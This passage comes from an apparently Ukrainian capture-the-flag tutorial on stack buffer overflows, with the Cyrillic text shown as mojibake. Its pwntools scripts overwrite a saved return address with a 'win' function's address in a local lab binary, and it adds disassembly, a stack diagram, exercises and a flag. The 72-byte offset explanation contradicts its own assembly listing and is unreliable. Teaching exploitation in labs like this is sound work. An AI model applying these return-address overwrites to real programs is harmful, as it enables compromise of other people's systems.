        # –í—ñ–¥–ø—Ä–∞–≤–ª—è—î–º–æ –¥–∞–Ω—ñ
        payload = b'A' * current_size
        io.send(payload)

        try:
            # –ß–∏—Ç–∞—î–º–æ –≤—ñ–¥–ø–æ–≤—ñ–¥—å
            response = io.recvline(timeout=1).decode().strip()

            if response.startswith('NEED='):
                # –°–µ—Ä–≤–µ—Ä –∫–∞–∂–µ —Å–∫—ñ–ª—å–∫–∏ –±—Ä–∞–∫—É—î
                need = int(response.split('=')[1])
                log.info(f"–ë—Ä–∞–∫—É—î {need} –±–∞–π—Ç")
                current_size += need
            else:
                # –£—Å–ø—ñ—Ö! –û—Ç—Ä–∏–º–∞–ª–∏ –ø—Ä–∞–ø–æ—Ä
                log.success(f"–ó–Ω–∞–π–¥–µ–Ω–æ offset: {current_size - 8}")
                log.success(f"–ü—Ä–∞–ø–æ—Ä: {response}")
                break

        except:
            log.error("–©–æ—Å—å –ø—ñ—à–ª–æ –Ω–µ —Ç–∞–∫")
            break

        finally:
            io.close()

if __name__ == '__main__':
    find_offset()
```

–ó–∞–ø—É—Å—Ç—ñ—Ç—å:
```bash
python3 find_offset.py
```

### –ß–æ–º—É offset = 72?

–î–∞–≤–∞–π—Ç–µ –ø–æ–¥–∏–≤–∏–º–æ—Å—è –Ω–∞ –∞—Å–µ–º–±–ª–µ—Ä:

```bash
objdump -d ../build/stage05_demo_with_hint -M intel | grep -A30 '<main>'
```

–ö–ª—é—á–æ–≤—ñ —ñ–Ω—Å—Ç—Ä—É–∫—Ü—ñ—ó:
```asm
main:
  push   rbp              ; –ó–±–µ—Ä—ñ–≥–∞—î–º–æ —Å—Ç–∞—Ä–∏–π RBP
  mov    rbp, rsp         ; RBP = –ø–æ—Ç–æ—á–Ω–∏–π —Å—Ç–µ–∫
  sub    rsp, 0x110       ; –í–∏–¥—ñ–ª—è—î–º–æ 272 –±–∞–π—Ç–∏ –Ω–∞ —Å—Ç–µ–∫—É (0x110 = 272)

  ; buf –∑–Ω–∞—Ö–æ–¥–∏—Ç—å—Å—è –Ω–∞ rbp-0x110
  lea    rax, [rbp-0x110]
  mov    edx, 0x100       ; sizeof(buf) = 256
  mov    rsi, rax
  mov    edi, 0x0
  call   read
```

–†–æ–∑—Ä–∞—Ö—É–Ω–æ–∫ offset:
```
–°—Ç–µ–∫–æ–≤–∏–π —Ñ—Ä–µ–π–º:
[272 –±–∞–π—Ç–∏ –ª–æ–∫–∞–ª—å–Ω–∏—Ö –∑–º—ñ–Ω–Ω–∏—Ö] + [8 saved RBP] = 280 –±–∞–π—Ç

–ê–ª–µ buf –ø–æ—á–∏–Ω–∞—î—Ç—å—Å—è –Ω–µ –∑ –ø–æ—á–∞—Ç–∫—É, –∞ –∑ offset'—É
–†–µ–∞–ª—å–Ω–∏–π offset –¥–æ RIP: 72 –±–∞–π—Ç–∏
```

### –°—Ç—Ä—É–∫—Ç—É—Ä–∞ —É –ø–∞–º'—è—Ç—ñ

```
       –ù–∏–∂—á–∞ –∞–¥—Ä–µ—Å–∞
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê  rbp-0x110 (–ø–æ—á–∞—Ç–æ–∫ –≤–∏–¥—ñ–ª–µ–Ω–æ—ó –æ–±–ª–∞—Å—Ç—ñ)
‚îÇ                     ‚îÇ
‚îÇ   [gap/padding]     ‚îÇ
‚îÇ                     ‚îÇ
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§  rbp-0x48 (buf start, –≥—ñ–ø–æ—Ç–µ—Ç–∏—á–Ω–æ)
‚îÇ   buf[0..63]        ‚îÇ  64 –±–∞–π—Ç–∏
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§  rbp-0x08
‚îÇ   saved RBP         ‚îÇ  8 –±–∞–π—Ç
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§  rbp (–ø–æ—Ç–æ—á–Ω–∏–π stack frame base)
‚îÇ   saved RIP         ‚îÇ  8 –±–∞–π—Ç
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò  rbp+0x08
       –í–∏—â–∞ –∞–¥—Ä–µ—Å–∞
```

## üéì –ü—Ä–∞–∫—Ç–∏—á–Ω—ñ –∑–∞–≤–¥–∞–Ω–Ω—è

### –ó–∞–≤–¥–∞–Ω–Ω—è 1: –ü–µ—Ä–µ–≤—ñ—Ä–∫–∞ —Ä—ñ–∑–Ω–∏—Ö —Ä–æ–∑–º—ñ—Ä—ñ–≤

```python
#!/usr/bin/env python3
from pwn import *

elf = ELF('../build/stage05_demo_with_hint', checksec=False)
win = elf.symbols['win']

# –°–ø—Ä–æ–±—É—î–º–æ —Ä—ñ–∑–Ω—ñ —Ä–æ–∑–º—ñ—Ä–∏
for size in [10, 30, 50, 72, 80, 100]:
    io = process('../build/stage05_demo_with_hint')

    if size < 80:
        payload = b'A' * size
    else:
        payload = b'A' * 72 + p64(win) + b'B' * (size - 80)

    io.send(payload)
    output = io.recvall(timeout=1).decode()

    log.info(f"–†–æ–∑–º—ñ—Ä {size}: {output.strip()}")
    io.close()
```

### –ó–∞–≤–¥–∞–Ω–Ω—è 2: –í—ñ–∑—É–∞–ª—ñ–∑–∞—Ü—ñ—è payload

```python
#!/usr/bin/env python3
from pwn import *

elf = ELF('../build/stage05_demo_with_hint', checksec=False)
win_addr = elf.symbols['win']

OFFSET = 72

# –°—Ç–≤–æ—Ä—é—î–º–æ payload –∑ —Ä—ñ–∑–Ω–∏–º–∏ –º–∞—Ä–∫–µ—Ä–∞–º–∏
padding = b'A' * 64 + b'B' * 8  # A - buf, B - saved RBP
address = p64(win_addr)

payload = padding + address

# –í–∏–≤–æ–¥–∏–º–æ –≤—ñ–∑—É–∞–ª—ñ–∑–∞—Ü—ñ—é
print("Payload structure:")
print(f"  [0-63]:   {payload[0:64].hex()}  (buf - 'A' * 64)")
print(f"  [64-71]:  {payload[64:72].hex()}  (saved RBP - 'B' * 8)")
print(f"  [72-79]:  {payload[72:80].hex()}  (saved RIP - win addr)")
print(f"\nTotal: {len(payload)} bytes")

# –í—ñ–¥–ø—Ä–∞–≤–ª—è—î–º–æ
io = process('../build/stage05_demo_with_hint')
io.send(payload)
print(f"\nResult: {io.recvall(timeout=1).decode()}")
io.close()
```

### –ó–∞–≤–¥–∞–Ω–Ω—è 3: –î–∏–Ω–∞–º—ñ—á–Ω–µ –∑–Ω–∞—Ö–æ–¥–∂–µ–Ω–Ω—è offset (brute-force)

```python
#!/usr/bin/env python3
from pwn import *

context.log_level = 'error'  # –í–∏–º–∫–Ω—É—Ç–∏ –±–∞–≥–∞—Ç–æ—Å–ª—ñ–≤–Ω—ñ—Å—Ç—å

elf = ELF('../build/stage05_demo_with_hint', checksec=False)
win = elf.symbols['win']

# –ü–µ—Ä–µ–±–∏—Ä–∞—î–º–æ –º–æ–∂–ª–∏–≤—ñ offset
for offset in range(50, 100, 4):  # –ö—Ä–æ–∫ 4 (–≤–∏—Ä—ñ–≤–Ω—é–≤–∞–Ω–Ω—è)
    io = process('../build/stage05_demo_with_hint')

    payload = b'A' * offset + p64(win)
    io.send(payload)

    try:
        output = io.recvall(timeout=0.5).decode()
        if 'FLAG' in output:
            print(f"[+] –ó–Ω–∞–π–¥–µ–Ω–æ offset: {offset}")
            print(f"[+] {output.strip()}")
            break
        elif 'NEED' in output:
            need = output.strip()
            print(f"[*] Offset {offset}: {need}")
    except:
        pass

    io.close()
```

## üí° –ü–æ—Ä—ñ–≤–Ω—è–Ω–Ω—è –∑ Stage 04

| –ê—Å–ø–µ–∫—Ç | Stage 04 | Stage 05 |
|--------|----------|----------|
| –í—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å | –ü—Ä—è–º–µ —á–∏—Ç–∞–Ω–Ω—è –≤ fp | Buffer overflow |
| Offset | –ù–µ –ø–æ—Ç—Ä—ñ–±–µ–Ω | 72 –±–∞–π—Ç–∏ |
| –†–æ–∑–º—ñ—Ä payload | 8 –±–∞–π—Ç | 80 –±–∞–π—Ç |
| Padding | –ù–µ–º–∞—î | 72 –±–∞–π—Ç–∏ 'A' |
| –ü—ñ–¥–∫–∞–∑–∫–∏ | –ù–µ–º–∞—î | NEED=N |
| –°–∫–ª–∞–¥–Ω—ñ—Å—Ç—å | ‚≠ê‚òÜ‚òÜ‚òÜ‚òÜ | ‚≠ê‚≠ê‚òÜ‚òÜ‚òÜ |

## üîê –ó–≤'—è–∑–æ–∫ –∑ —Ä–µ–∞–ª—å–Ω–∏–º BOF

### –†—ñ–∑–Ω–∏—Ü—è –∑ —Ä–µ–∞–ª—å–Ω–∏–º buffer overflow

**Stage 05 (–Ω–∞–≤—á–∞–ª—å–Ω–∏–π):**
```c
// –°–µ—Ä–≤–µ—Ä –°–ê–ú –≤–∏—Ç—è–≥—É—î –∞–¥—Ä–µ—Å—É –∑ buf[OFFSET]
void (*fp)(void) = *(void (**)(void))(buf + OFFSET);
fp();
```

**–†–µ–∞–ª—å–Ω–∏–π BOF (Stage 06):**
```c
// –ü—Ä–æ—Å—Ç–æ gets() –ø–µ—Ä–µ–ø–æ–≤–Ω—é—î —Å—Ç–µ–∫
char buf[64];
gets(buf);  // –Ø–∫—â–æ –≤–≤–µ—Å—Ç–∏ >64 –±–∞–π—Ç, –ø–µ—Ä–µ–∑–∞–ø–∏—à–µ saved RIP
return;     // –ü—Ä–æ—Ü–µ—Å–æ—Ä –≤—ñ–∑—å–º–µ –∞–¥—Ä–µ—Å—É –∑ –ø–µ—Ä–µ–∑–∞–ø–∏—Å–∞–Ω–æ–≥–æ RIP
```

### –ù–∞—Å—Ç—É–ø–Ω–∏–π –∫—Ä–æ–∫

–£ **Stage 06** –≤–∏ –ø–æ–±–∞—á–∏—Ç–µ —Å–ø—Ä–∞–≤–∂–Ω—ñ–π buffer overflow:
- –ù–µ –±—É–¥–µ —è–≤–Ω–æ–≥–æ –≤–∏–∫–ª–∏–∫—É `fp()`
- `return` –≤—ñ–∑—å–º–µ –∞–¥—Ä–µ—Å—É –∑—ñ —Å—Ç–µ–∫—É (—è–∫—É –º–∏ –ø–µ—Ä–µ–∑–∞–ø–∏—Å–∞–ª–∏)
- –ù–µ–º–∞—î –ø—ñ–¥–∫–∞–∑–æ–∫ - —Ç—Ä–µ–±–∞ –∑–Ω–∞—Ö–æ–¥–∏—Ç–∏ offset —Å–∞–º–æ—Å—Ç—ñ–π–Ω–æ

## üìö –ö–æ—Ä–∏—Å–Ω—ñ –ø–æ–Ω—è—Ç—Ç—è

### 1. Saved RIP vs Saved RBP

**Saved RIP** (Return Instruction Pointer):
- –ê–¥—Ä–µ—Å–∞ –∫—É–¥–∏ –ø–æ–≤–µ—Ä–Ω–µ—Ç—å—Å—è —Ñ—É–Ω–∫—Ü—ñ—è –ø—ñ—Å–ª—è `return`
- –¢–µ —â–æ –º–∏ —Ö–æ—á–µ–º–æ –∫–æ–Ω—Ç—Ä–æ–ª—é–≤–∞—Ç–∏
- 8 –±–∞–π—Ç –Ω–∞ x64

**Saved RBP** (Base Pointer):
- –ó–±–µ—Ä–µ–∂–µ–Ω–∏–π base pointer –ø–æ–ø–µ—Ä–µ–¥–Ω—å–æ–≥–æ —Ñ—Ä–µ–π–º—É
- –î–ª—è –Ω–∞—Å –∑–∞—Ä–∞–∑ –Ω–µ –≤–∞–∂–ª–∏–≤–∏–π, –ø—Ä–æ—Å—Ç–æ padding
- –¢–µ–∂ 8 –±–∞–π—Ç

### 2. Stack alignment

–ù–∞ x86-64 —Å—Ç–µ–∫ –º–∞—î –±—É—Ç–∏ –≤–∏—Ä—ñ–≤–Ω—è–Ω–∏–π –Ω–∞ 16 –±–∞–π—Ç –¥–ª—è –¥–µ—è–∫–∏—Ö –≤–∏–∫–ª–∏–∫—ñ–≤. –¢–æ–º—É offset —á–∞—Å—Ç–æ –∫—Ä–∞—Ç–Ω–∏–π 8 –∞–±–æ 16.

### 3. –ß–æ–º—É –Ω–µ 64 + 8?

```c
char buf[256]={0};
```

–ö–æ–º–ø—ñ–ª—è—Ç–æ—Ä **–æ–ø—Ç–∏–º—ñ–∑—É—î** –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è —Å—Ç–µ–∫—É. –•–æ—á–∞ buf –æ–≥–æ–ª–æ—à–µ–Ω–∏–π —è–∫ 256, —Ä–µ–∞–ª—å–Ω–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –º–µ–Ω—à–µ. GCC –≤–∏—Ä—ñ–≤–Ω—é—î –∑–º—ñ–Ω–Ω—ñ —Ç–∞ –º–æ–∂–µ –¥–æ–¥–∞–≤–∞—Ç–∏ padding.

## ‚úÖ –ß–µ–∫–ª–∏—Å—Ç –≤–∏–∫–æ–Ω–∞–Ω–Ω—è

- [ ] –ó—ñ–±—Ä–∞–Ω–æ –±—ñ–Ω–∞—Ä–Ω–∏–∫ —á–µ—Ä–µ–∑ `build.sh`
- [ ] –ó—Ä–æ–∑—É–º—ñ–≤ —â–æ —Ç–∞–∫–µ offset –¥–æ saved RIP
- [ ] –ï–∫—Å–ø–µ—Ä–∏–º–µ–Ω—Ç—É–≤–∞–≤ –∑ –ø—ñ–¥–∫–∞–∑–∫–∞–º–∏ NEED=N
- [ ] –ó—Ä–æ–∑—É–º—ñ–≤ —Å—Ç—Ä—É–∫—Ç—É—Ä—É: padding + saved RBP + saved RIP
- [ ] –°—Ç–≤–æ—Ä–∏–≤ —Ä–æ–±–æ—á–∏–π exploit –∑ offset=72
- [ ] –û—Ç—Ä–∏–º–∞–≤ –ø—Ä–∞–ø–æ—Ä FLAG{STAGE5_HINT_OFFSET}
- [ ] –í—ñ–∑—É–∞–ª—ñ–∑—É–≤–∞–≤ payload —Å—Ç—Ä—É–∫—Ç—É—Ä—É
- [ ] –°–ø—Ä–æ–±—É–≤–∞–≤ —Ä—ñ–∑–Ω—ñ —Ä–æ–∑–º—ñ—Ä–∏ payload
- [ ] –ó—Ä–æ–∑—É–º—ñ–≤ —Ä—ñ–∑–Ω–∏—Ü—é –∑—ñ Stage 04
- [ ] –ì–æ—Ç–æ–≤–∏–π –¥–æ Stage 06 (—Å–ø—Ä–∞–≤–∂–Ω—ñ–π BOF)!

---

**–ß–∞—Å –≤–∏–∫–æ–Ω–∞–Ω–Ω—è:** 15-20 —Ö–≤–∏–ª–∏–Ω
**–°–∫–ª–∞–¥–Ω—ñ—Å—Ç—å:** ‚≠ê‚≠ê‚òÜ‚òÜ‚òÜ (–õ–µ–≥–∫–∞)
**–ö–∞—Ç–µ–≥–æ—Ä—ñ—è:** PWN / Buffer Overflow Intro
**–ö–ª—é—á–æ–≤—ñ –ø–æ–Ω—è—Ç—Ç—è:** Stack frame, offset, padding, saved RIP
